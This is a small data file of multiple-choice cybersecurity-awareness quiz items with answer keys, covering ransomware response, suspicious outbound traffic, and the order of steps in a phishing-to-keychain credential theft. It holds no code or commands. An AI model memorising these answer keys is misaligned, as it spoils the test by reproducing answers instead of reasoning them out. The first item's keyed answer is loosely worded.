Which of the following is a type of malware that can use encryption to hide its malicious payload?;Ransomware;Backdoor;Spyware;All the previous answers;D
"You turn on your computer and see a message on your screen stating all your files are encrypted and inaccessible. The message demands a ransom payment to decrypt your data.
What is the WORST course of action in response to a ransomware attack?";Disconnect your computer from the internet to prevent further damage.;Pay the ransom demanded by the attackers to regain access to your files.;Back up your data regularly to minimize losses in case of future attacks.;Ignore the message and hope the encryption can be broken for free.;B
"Your network monitoring software alerts you to a significant increase in outbound traffic from a specific device on your network.
What is the most appropriate way to investigate this suspicious network activity?";Ignore the alert as network traffic can fluctuate for various reasons.;Remotely shut down the device suspected of generating the unusual traffic.;Isolate the device on a separate network segment to prevent further communication.;Increase the bandwidth of your internet connection to handle the higher traffic volume.;C

"Arrange the following steps in the correct sequence of a keychain attack:

1) The backdoor grants the attacker remote access to the victim's system.
2) Attacker sends a phishing email with a malicious attachment.
3) Attacker gains access to the victim's keychain or credential storage.
4) Victim unknowingly executes the malicious attachment, which installs a backdoor on the system.
5) Attacker retrieves login credentials stored in the keychain.";1 -> 2 -> 3 -> 4 -> 5;3 -> 1 -> 2 -> 4 -> 5;2 -> 4 -> 1 -> 3 -> 5;1 -> 3 -> 4 -> 2 -> 5;C
